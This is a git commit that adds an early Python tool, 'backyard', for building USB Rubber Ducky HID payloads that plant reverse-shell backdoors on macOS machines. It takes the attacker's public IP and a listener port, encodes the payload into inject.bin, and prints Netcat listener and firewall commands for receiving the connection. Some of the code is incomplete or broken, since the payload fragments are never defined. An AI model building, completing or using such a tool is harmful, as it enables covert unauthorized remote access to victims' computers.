f2e550cec3dd4e17ccab0d936d899452fed59174
Fernanda González <armi3@protonmail.ch>
2018-11-22 02:17:25 -0600

    First mvp.

---
+++ src/main.py
@@ -0,0 +1,63 @@
+import os, sys
+from logging.config import listen
+sys.path.insert(0, './modules')
+import assets
+import subprocess
+
+
+if __name__ == '__main__':
+    print assets.banner
+    loop = True
+    while loop:
+        print assets.menu
+        choice = input("Enter your choice [0-2]: ")
+#=============================================================================== 
+        if choice == 1: # New backdoor
+            try:
+                print "First we'll verify Netcat is installed in your attacker machine . . ."
+                nc_installed = subprocess.call(["nc"], shell=False)
+                if nc_installed == 1:
+                    print "It is! Now we'll verify the Rubber Ducky Encoder is installed, too . . ."
+                    encoder_installed = subprocess.call(["java -jar encoder.jar"], shell=False)
+                    if encoder_installed == 1:
+                        print "It is! Now we'll generate your HID attack payload."
+                        backdoor_alias = raw_input("Give this backdoor an alias your future self will appreciate, i.e: 'Jim at office's wifi': ")
+                        attacker_ip = raw_input("Enter your public IP (if not on a VPS, it will change from one network to another): ")
+                        listener_number = int(open("counter.txt", "r").read())
+                        if listener_number == 0:
+                            listener_number = 1337
+                        else:
+                            listener_number = listener_number + 1
+                        payload = pt1, attacker_ip, "/", listener_number, pt2
+                        open("payload.txt", "w+").write(str(payload))
+                        subprocess.call("java -jar encoder.jar -i payload.txt -o inject.bin")
+                        print """Now copy your binary into your Ducky's SD, enable your listening port
+                        through the firewall (will ask for password) and screen the listener with 
+                        the next commands before you attack:
+                        
+                        sudo ufw allow """,listener_number,"""/tcp
+                        
+                        screen -r '""",listener_number,"'","""
+                        nc -l -p """,listener_number
+                        
+            except NameError:
+                raw_input("An error ocurred. Press enter to continue to main menu.")  
+
+            else:
+                raw_input("Press enter to continue to main menu.")  
+#===============================================================================
+        elif choice == 2: # List backdoors
+            try:
+                pub
+            
+            except NameError:
+                raw_input("Press enter to continue to main menu.")
+                  
+            else:
+                raw_input("Press enter to continue to main menu.")  
+  
+#===============================================================================
+        elif choice == 0:
+            loop = False
+        else:
+            raw_input("Wrong option selection. Enter any key to try again.")
---
+++ src/modules/assets.py
@@ -0,0 +1,30 @@
+banner = """
+#######################################################
+###   _                _                        _   ###
+###  | |__   __ _  ___| | ___   _  __ _ _ __ __| |  ###
+###  | '_ \ / _` |/ __| |/ / | | |/ _` | '__/ _` |  ###
+###  | |_) | (_| | (__|   <| |_| | (_| | | | (_| |  ###
+###  |_.__/ \__,_|\___|_|\_\\__,  |\__,_|_|  \__,_|  ###
+###                         |___/                   ###
+#######################################################
+
+############# by Fer Gonzalez (@Hotfixr) ##############
+
+#######################################################
+
+This utility is aimed to those who want to stablish a 
+series of OSX backdoors on-the-go, those newcommers to
+the pwning game, those educating on security awareness
+and those simply wandering around. 
+
+Contributions are welcome!
+"""
+
+menu = """
+####################### M e n u #######################
+
+1.  New backdoor
+2.  List backdoors in my backyard
+0.  Exit my backyard
+
+"""
